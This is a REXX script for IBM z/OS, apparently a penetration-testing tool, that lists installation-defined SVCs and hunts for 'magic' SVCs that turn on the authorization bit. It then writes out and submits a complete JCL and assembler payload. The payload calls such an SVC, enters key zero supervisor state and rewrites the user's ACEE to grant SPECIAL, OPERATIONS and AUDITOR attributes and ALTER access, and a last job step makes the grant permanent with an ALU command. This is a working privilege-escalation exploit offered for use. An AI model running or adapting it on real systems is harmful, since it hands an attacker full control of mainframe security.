/* REXX */

/****************************************************************************/
/*  ELV.SVC is a tool to list check for MAGIC SVC or AUTH SVC               */
/*  an AUTH SVC, is a user defined SVC (n>200) that sets the                */
/*  authorization bit ON.                                                   */  
/*  Used by some products or admins to easily get high privileges.          */
/*                                                                          */
/*  Usage : ex 'ELV.SVC'  'LIST'                                            */
/*                        custom SVC calls (>200)                           */
/*          ex 'ELV.SVC'  'DSN=PDS_DSN NUM=233 12=C1C1C1C1'                 */
/*                        Grants SPECIAL using SVC 233                      */
/*                        Before calling SVC 233                            */
/*                        ELV.SVC puts C1C1C1C1 into register 12            */
/*                        in case there is a check of some sort             */
/*                                                                          */
/*                                                                          */
/* Sources: http://www.cbttape.org/xephon/xephonr/rac0005.pdf               */
/*          http://www.mzelden.com/mvsfiles/iplinfo.txt                     */
/*          zOS pentesting RMS partners presentation at CONFEX              */
/****************************************************************************/


/**
 ** Parsing input parameters
**/


parse arg parm1 "=" value1 parm2 "=" value2 parm3 "=" value3

if (translate(parm1) = "LIST") then
  DO
    Call SVC
    exit
  END 

if parm1 <> "DSN" & parm2 <> "NUM" then do
    say "Usage: ex 'ELV.SVC' 'LIST' to check for magic SVC"
    say "       ex 'ELV.SVC' 'DSN=PDS_DSN NUM=233 12=C1C1C1C1'"
    say "                     places C1C1C1C1 in register 12"
    say "                     then calls SVC 233 to grand SPECIAL"
    say "       ex 'ELV.SVC' 'DSN=PDS_DSN NUM=233"
    exit(-1)
end


dsn = value1
svc_num = value2
svc_reg = parm3
svc_reg_v = value3


if length(svc_reg_v) <> 8 & length(svc_reg_v) <> 0 then
  Do
    say svc_reg_v "value needs to be 4 bytes long in Hex"
    exit
  End

if (svc_num > 255 | length(svc_num) = 0) then
  Do
    say svc_num " svc needs to be between 200 and 255"
    exit
  End

if svc_reg > 16 & length(svc_reg_v) <> 0 then
  Do
    say svc_reg " register needs to be <= 16"
    exit
  End

  
say "Loading" svc_reg_v "into" svc_reg
say "then using SVC" svc_num " to get Auth"

launch_payload(svc_num, svc_reg,svc_reg_v,dsn)

exit

/**
 ** SVC information sub-routine                                       
**/

SVC:

CVT      = C2d(Storage(10,4))                /* point to CVT         */         
CVTFLAG2 = Storage(D2x(CVT+377),1)           /* CVT flag byte 2      */         
CVTEXT2  = C2d(Storage(D2x(CVT + 328),4))    /* point to CVTEXT2     */                                                                                  

CVTABEND  = C2d(Storage(D2x(CVT+200),4))     /* point to CVTABEND    */         
SCVT      = CVTABEND        /* this is the SCVT -  mapped by IHASCVT */         
SCVTSVCT  = C2d(Storage(D2x(SCVT+132),4))    /* point to SVCTABLE    */         
SCVTSVCR  = C2d(Storage(D2x(SCVT+136),4))    /* point to SVC UPD TBL */
svc_auth.0    = 0   /* total number of auth SVC                      */         

/**
 ** Standard SVC table display loop
**/

say '     '                                                                   
say 'Custom defined SVC:'                                                              
say '  Num Hex  EP-Addr  AM TYP APF ASF AR NP UP' ,             
      'CNT AUTH-BIT'                                                      
Do SVCLST = 200 to 255                                                            
  SVCTENT  = Storage(D2x(SCVTSVCT+(SVCLST*8)),8)  /* SVC Table Entry */         
  SVCTENTU = Storage(D2x(SCVTSVCR+(SVCLST*24)),24) /* SVC UP TBL ENT */         
  SVCURCNT = C2d(Substr(SVCTENTU,21,2))      /* SVC update count     */         
  SVCAMODE = Substr(SVCTENT,1,1)             /* AMODE indicator      */         
  SVCEPA   = Substr(SVCTENT,1,4)             /* Entry point addr     */         
  SVCEPAR  = C2x(SVCEPA)                     /* EPA - readable       */         
  SVCEPAR  = Right(SVCEPAR,8,'0')            /* ensure leading zeros */         
  SVCATTR1 = Substr(SVCTENT,5,1)             /* SVC attributes       */         
  SVCATTR3 = Substr(SVCTENT,6,1)             /* SVC attributes       */         
  SVCLOCKS = Substr(SVCTENT,7,1)             /* Lock attributes      */         
  
  not_used = 0
  do k = 0 to SVCLST
    if SVCEPAR == svc_list.k then do
        not_used = 1        
    end
  end
  
  if not_used == 0 then do 
    svc_list.SVCLST = SVCEPAR
  end
  
  /* Check the code for any bit flip grantint SPECIAL */
  /****************************************************/
  call check_auth  SVCEPA
  auth_bit = RESULT
  if auth_bit = "YES" then
    Do
        svc_auth.0 = svc_auth.0 + 1
        svc_auth.SVCLST = SVCEPA
    End
  
  /*  Check amode           */                                                  
  /**************************/                                                  
  If Bitand(SVCAMODE,'80'x) = '80'x then SVC_AMODE = '31'                       
    Else SVC_AMODE = '24'                                                       
  
  
  /*  Check SVC type flag   */                                                  
  /**************************/                                                  
  Select                                     /* determine SVC type   */         
    When Bitand(SVCATTR1,'C0'x) = 'C0'x then SVCTYPE = '3/4'                    
    When Bitand(SVCATTR1,'80'x) = '80'x then SVCTYPE = ' 2 '                    
    When Bitand(SVCATTR1,'20'x) = '20'x then SVCTYPE = ' 6 '                    
    When Bitand(SVCATTR1,'00'x) = '00'x then SVCTYPE = ' 1 '                    
    Otherwise SVCTYPE = '???'                                                   
  End /* select */                                                              
  
  
  /*  Check other SVC flags */                                                  
  /**************************/                                                  
  SVCAPF = '   ' ; SVCESR = '   ' ; SVCNP = '  '  /* init as blanks  */         
  SVCASF = '   ' ; SVCAR  = '  '  ; SVCUP = '  '  /* init as blanks  */         
  If Bitand(SVCATTR1,'08'x) = '08'x then SVCAPF  = 'APF'                        
  If Bitand(SVCATTR1,'04'x) = '04'x then SVCESR  = 'ESR'                        
  If Bitand(SVCATTR1,'02'x) = '02'x then SVCNP   = 'NP'                         
  If Bitand(SVCATTR1,'01'x) = '01'x then SVCASF  = 'ASF'                        
  If Bitand(SVCATTR3,'80'x) = '80'x then SVCAR   = 'AR'                         
  If SVCURCNT <> 0 then SVCUP = 'UP'   /* this SVC has been updated  */         
  If SVCURCNT = 0 then do              /* svc never updated          */         
    SVCURCNT = '   '                                                            
  End                                                                           
  Else do /* most, if not all UP nums are sngl digit- center display */         
   If SVCURCNT < 10 then SVCURCNT = Right(SVCURCNT,2,' ') || ' '                
     Else SVCURCNT = Right(SVCURCNT,3,' ')                                      
  End /* else do */                                                             
                                                                                    
  If not_used == 1 then do                   /* this SVC is not used */         
    iterate
  End
                                                                                
  say ' '  Right(SVCLST,3,' ') '('Right(D2x(SVCLST),2,0)')' ,                 
    SVCEPAR SVC_AMODE SVCTYPE SVCAPF SVCASF ,                     
    SVCAR SVCNP SVCUP SVCURCNT auth_bit                                       
    
End /* Do SVCLST = 0 to 255 */                                                  


Do i=200 to 255
    if length(svc_auth.i) = 4 Then
      Do
        say ""
        say "*** Dumping AUTH SVC "||i||" ***"
        string = Storage(C2X(svc_auth.i),100)
        say C2X(string)
      End
End



Return                                                                          


/**
 ** Routine to check for common instruction to flip SPECIAL bit in ACEE
**/

check_auth:

arg  svc_addr

END_CHAR = "0000"
BR_14 = "07FE"
BR_15 = "07FF"

/* 58%400B4 = L %, 180(4)  = Load JSCB (TCB + 180) to registry % (1 to F) */
/* 9601%0EC = OI 236(%), 1  = Flip authorization bit in JSCB + 236 */

/* jscb_op = "*58%400B4*" */

flip_auth_op = "*9601%0EC*"


MAX = 1000
string =  C2X(Storage(C2X(svc_addr),MAX))

return patmatch(flip_auth_op,string)
           

/**
 ** Closest I found to a REGEX function in REXX 
**/

patmatch: PROCEDURE EXPOSE gbl.
TRACE N
IF ARG() <> 2 THEN RETURN 'PATMATCH ERROR: 2 parms required, caller',
                          'passed 'ARG()' parms'
haystack = ARG(2)                  /* Data to be searched w/ pattern  */
pattern = ARG(1)                   /* Search pattern                  */
wild = 0                           /* No '*' seen (yet)               */
  DO WHILE pattern <> ''           /* Process pattern from L to R     */

  a = POS('*',pattern)             /* Look for '*' in pattern         */
  IF a > 0 THEN                    /* If found, extract any           */
    DO                             /*  preceeding search string       */
    PARSE VAR pattern needle '*' +0 newpattern
    IF needle = '' THEN
      DO                           /* If no preceeding search string, */
      wild = 1                     /*  mark next search as 'wild card'*/
      PARSE VAR newpattern 2 pattern /* remove '*' from pattern       */
      ITERATE                      /*    and continue testing         */
      END
    END

  p = POS('%',pattern)             /* Look for '%' in pattern         */
  IF p > 0 & (a = 0 | p < a) THEN  /* If found before any '*', extract*/
    DO                             /*  any preceeding search string   */
    PARSE VAR pattern needle '%' +0 newpattern
    IF needle = '' THEN
      DO                           /* If no preceeding search string, */
      needle = LEFT(haystack,1)    /* take next text as search string */
      PARSE VAR newpattern 2 newpattern
      wild = 0                     /* Mark next search 'not wild card'*/
      END
    END

  IF p = 0 & a = 0                 /* No special chars, use remainder */
  THEN PARSE VAR pattern needle newpattern

  pattern = newpattern             /* Update pattern for next pass    */
  pos = POS(needle,haystack)       /* Look for this pattern           */
  IF pos = 0 THEN RETURN 0         /* Not found, outta here           */
  IF pos > 1 THEN                  /* Found, but not at start-of-text */
    IF wild <> 1                   /* Wild card char in effect?       */
    THEN RETURN 0                  /* No wild card, outta here        */
  wild = 0                         /* Reset wild card character       */
  len = LENGTH(haystack)-LENGTH(needle)-pos+1
  haystack = RIGHT(haystack,len)   /* Remove data that we just scanned*/
  IF haystack = '' THEN
    DO                             /* No more data to scan...         */
    IF pattern = ''                /* Out of pattern as well?         */
    THEN RETURN 1                  /* Yes, that's a match.            */
    IF pattern = '*'               /* Did pattern end with wild card? */
    THEN RETURN 1                  /* Yes, that's a match too.        */
    RETURN 0                       /* Else, sorry, not a match.       */
    END
  END                              /* Ran out of pattern to scan      */
IF wild = 1                        /* Did pattern end with wild card? */
THEN RETURN "YES"                      /* Yes, that's a match.            */
ELSE RETURN "-"                      /* Else, sorry, not a match.       */


launch_payload:
    svc_num = arg(1)
    svc_reg = arg(2)
    svc_reg_v = arg(3)
    dsn = arg(4)
    
    PROG = rand_char(6)    
    say "Compiling " PROG "in" dsn
    QUEUE "//CMPSVC1 JOB (JOBNAME),'XSS',CLASS=A,NOTIFY=&SYSUID"
    QUEUE "//*"
    QUEUE "//BUILD   EXEC ASMACL"
    QUEUE "//C.SYSLIB  DD DSN=SYS1.SISTMAC1,DISP=SHR"
    QUEUE "//          DD DSN=SYS1.MACLIB,DISP=SHR"
    QUEUE "//C.SYSIN   DD *"
    QUEUE "       CSECT"
    QUEUE "       AMODE 31"
    QUEUE "       STM 14,12,12(13)"
    QUEUE "       BALR 12,0"
    QUEUE "       USING *,12"
    QUEUE "       ST 13,SAVE+4"
    QUEUE "       LA 13,SAVE"
    QUEUE "*"
    if length(svc_reg) <> 0 then
      Do
         QUEUE "       L "||svc_reg||",PARAM"
      End
    QUEUE "       SVC "||svc_num||""
    QUEUE "       MODESET KEY=ZERO,MODE=SUP"
    QUEUE "       L 5,X'224'  POINTER TO ASCB"
    QUEUE "       L 5,X'6C'(5)        POINTER TO ASXB"
    QUEUE "       L 5,X'C8'(5)        POINTER TO ACEE"
    QUEUE "       NI X'26'(5),X'00'"
    QUEUE "       OI X'26'(5),X'B1'   SPE + OPER + AUDITOR ATTR"
    QUEUE "       NI X'27'(5),X'00'"
    QUEUE "       OI X'27'(5),X'80'   ALTER ACCESS"
    QUEUE "*"
    QUEUE "       L 13,SAVE+4"
    QUEUE "       LM 14,12,12(13)"
    QUEUE "       XR 15,15"
    QUEUE "       BR 14"
    QUEUE "*"
    QUEUE "SAVE   DS 18F"
    if length(svc_reg) <> 0  then
      Do
         QUEUE "PARAM  DC  X'"||svc_reg_v||"'   "
      End    
    QUEUE "       END"
    QUEUE "/*"
    QUEUE "//L.SYSLMOD DD DISP=SHR,DSN="||dsn||""
    QUEUE "//L.SYSIN   DD *"
    QUEUE "  NAME "||PROG||"(R)"
    QUEUE "/*"
    QUEUE "//STEP01 EXEC PGM="||PROG||",COND=(0,NE)"
    QUEUE "//STEPLIB   DD DSN="||dsn||",DISP=SHR"
    QUEUE "//STEP02 EXEC PGM=IKJEFT01,COND=(0,NE)"
    QUEUE "//SYSTSIN DD *"
    QUEUE " ALU "||userid()||" SPECIAL OPERATIONS"
    QUEUE "/*"
    QUEUE "//SYSIN   DD DUMMY"
    QUEUE "//SYSTSPRT DD SYSOUT=*"    
    QUEUE "//*"
    QUEUE "$$"
    
    o = OUTTRAP("output.",,"CONCAT")       
    address tso "SUBMIT * END($$)"
    o = OUTTRAP(OFF) 

    exit(0)

rand_char:
    length = arg(1)
    out = ""
    do counter=0 to length
       i = RANDOM(1,3)
       if i ==1 then out = out||D2C(RANDOM(193,201))
       if i ==2 then out = out||D2C(RANDOM(226,233))
       if i ==3 then out = out||D2C(RANDOM(209,217))
    end
    return out

exit(0)
